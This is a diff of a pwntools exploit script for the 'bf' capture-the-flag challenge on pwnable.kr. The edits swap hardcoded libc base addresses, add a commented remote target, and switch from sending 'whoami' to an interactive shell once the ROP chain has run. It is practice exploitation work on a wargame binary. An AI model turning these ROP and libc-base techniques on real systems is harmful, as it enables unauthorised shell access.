@@ -7,11 +7,15 @@ log.info("Start pwning...")
 
 # Load executable
 exe = ELF("./bf")
+#exe = ELF("./ctf-bf")
 
 # Libc
 libc = exe.libc
 #libc_base = 0xf7e1b000 # TODO - re-adjust base - I changed it cuz of gdb 
 libc_base = 0xf7e1b000 # TODO - re-adjust base - I changed it cuz of gdb 
+#libc_base = 0xf7d73000 # TODO - re-adjust base - I changed it cuz of gdb 
+#libc_base = 0xf7d73000 # The original base
+#libc_base = 0xf7df8000 # The original base
 #libc_base = 0xf7e0a000 # TODO - re-adjust base - I changed it cuz of gdb 
 libc.address = libc_base
 puts_addr = p32(next(libc.search(b"puts")))
@@ -33,6 +37,8 @@ print(f"ROP: {my_rop}")
 print(f"ROP offset: {hex(rop.ebx.address)}")
 #print(f"DUMP: {my_rop.dump()}")
 # Start process
+#conn = remote("pwnable.kr",9001)
+#conn = process("./ctf-bf")
 conn = process("./bf")
 #conn = gdb.debug("./bf",
 #env={"LD_PRELOAD":"./libc.so.6"}, gdbscript='''
@@ -99,11 +105,12 @@ print(conn.recvline()) # receive until newline
 #print(conn.recvline()) # receive until newline
 output = conn.recv()
 print(f"Program output: {output}") # receive until newline
-conn.send("whoami\n")
-output = conn.recvline()
+#conn.send("ls\n")
+conn.interactive()
+#output = conn.recvline()
 #output += conn.recvline()
 #output += conn.recvline()
-print(f"Program output: {output.decode()}") # receive until newline
+#print(f"Program output: {output.decode()}") # receive until newline
 #conn.recvuntil(b"result:") # receive until given keyword
 #conn.send(b"-,+" + "\n" + "AB")
 
